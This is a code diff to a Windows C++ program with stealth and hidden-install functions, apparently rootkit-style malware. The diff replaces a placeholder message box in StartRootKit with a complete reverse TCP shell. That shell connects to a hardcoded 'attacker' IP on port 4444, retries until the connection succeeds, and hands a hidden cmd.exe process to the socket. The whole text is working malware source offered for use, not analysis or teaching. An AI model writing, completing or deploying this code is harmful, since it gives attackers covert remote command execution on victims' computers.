@@ -1,7 +1,13 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <shlobj.h>
 #include <iostream>
 #include <string>
+
+#include <ws2tcpip.h>
+#pragma comment(lib, "ws2_32.lib")
+
+
 
 // ===== CONFIGURATION - CHANGE THESE VALUES =====
 const wchar_t* PROGRAM_NAME = L"MyCustomApp";  // Change this to your desired name
@@ -65,12 +71,59 @@ void InstallAndHide() {
 }
 
 void StartRootKit() {
-    MessageBoxW(
-        NULL,
-        L"hello",
-        L"hello",
-        MB_OK | MB_ICONINFORMATION | MB_TOPMOST
-    );
+    // ===== REVERSE TCP CONFIGURATION =====
+    const char* HOST = "192.168.10.112";  // Attacker's IP
+    const int PORT = 4444;               // Attacker's port
+    // ===== END CONFIGURATION =====
+
+    WSADATA wsaData;
+    SOCKET sock;
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    struct sockaddr_in addr;
+
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return;
+    }
+
+    // Create socket
+    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (sock == INVALID_SOCKET) {
+        WSACleanup();
+        return;
+    }
+
+    // Set up target address
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(PORT);
+    inet_pton(AF_INET, HOST, &addr.sin_addr);
+
+    // Connect to attacker (with retry logic)
+    while (connect(sock, (SOCKADDR*)&addr, sizeof(addr))) {
+        Sleep(5000);  // Retry every 5 seconds
+    }
+
+    // Hide window and redirect I/O
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdInput = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError = (HANDLE)sock;
+
+    // Create hidden cmd.exe process
+    TCHAR cmd[] = TEXT("cmd.exe");
+    if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    // Cleanup
+    closesocket(sock);
+    WSACleanup();
 }
 
 void LaunchHiddenCopy() {
@@ -91,6 +144,8 @@ void LaunchHiddenCopy() {
 
 int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    // StartRootKit();
     
     if (IsHiddenInstance()) {
         // Stealth mode - begin rootkit functionality
@@ -100,5 +155,6 @@ int main() {
         InstallAndHide();
         LaunchHiddenCopy();
     }
+    
     return 0;
 }
